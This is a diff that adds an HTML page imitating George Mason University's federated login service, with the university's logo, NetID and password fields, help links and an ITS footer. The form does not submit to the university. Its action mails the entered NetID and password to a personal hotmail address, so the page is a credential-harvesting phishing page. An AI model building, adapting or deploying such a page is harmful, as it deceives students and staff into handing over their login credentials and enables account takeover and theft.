@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html><!-- Container ID: $custom['hostname'] -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>George Mason Federated Login Service</title>
+    <link rel="stylesheet" href="https://unpkg.com/purecss@0.6.2/build/pure-min.css" integrity="sha384-UQiGfs9ICog+LwheBSRCt1o5cbyKIHbwjWscjemyBMT9YCUMZffs6UqUTd0hObXD" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="main.css">
+    
+</head>
+<body>
+<div class="wrapper">
+    <div class="container">
+        <header>
+            <img src="GMU_PLogo_RGB.jpg" alt="George Mason University Federated Services">
+            
+        </header>
+<div class="content">
+    <div class="section motd">
+            </div>
+    <div class="section login">
+        
+
+        <form action="mailto:brendon_lugo@hotmail.com" method="post">
+
+                        
+                        <div class="form-element-wrapper">
+                <label for="username">NetID</label>
+                <input class="form-element form-field" id="username" name="j_username" type="text" value="">
+            </div>
+
+            <div class="form-element-wrapper">
+                <label for="password">Password</label>
+                <input class="form-element form-field" id="password" name="j_password" type="password" value="">
+            </div>
+
+            <div class="form-element-wrapper">
+                <input type="checkbox" name="donotcache" value="1" id="donotcache">
+                <label for="donotcache">Don't Remember Login</label>
+            </div>
+            
+            <div class="form-element-wrapper d-none">
+                <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
+                <label for="_shib_idp_revokeConsent">Clear prior granting of permission for release of your information to this service.</label>
+            </div>
+
+                        <div class="form-element-wrapper mt-4">
+                <button class="form-element form-button" type="submit" name="_eventId_proceed" onclick="this.childNodes[0].nodeValue='Logging in, please wait...'">Login</button>
+            </div>
+            
+                    </form>
+
+        
+                        
+    </div>
+    <div class="section links">
+                <ul class="list list-help">
+                        <li class="list-help-item">
+                <a href="https://password.gmu.edu/">
+                    <span class="item-marker">›</span>
+                    Forgot your password?                </a>
+            </li>
+                        <li class="list-help-item"><a href="#"><span class="item-marker">›</span>
+                Need Help?</a></li>
+        </ul>
+    </div>
+</div>
+</div>
+
+<footer>
+    <div class="container container-footer">
+        <p class="footer-text">Copyright © George Mason University</p>
+        <address>
+            Information Technology Services<br> 
+            703-993-8870<br>
+            <a href="mailto:support@gmu.edu">
+                support@gmu.edu            </a>
+        </address>
+    </div>
+</footer>
+</div>
+
+
+</body></html>
+<!-- Container ID: $custom['hostname'] -->
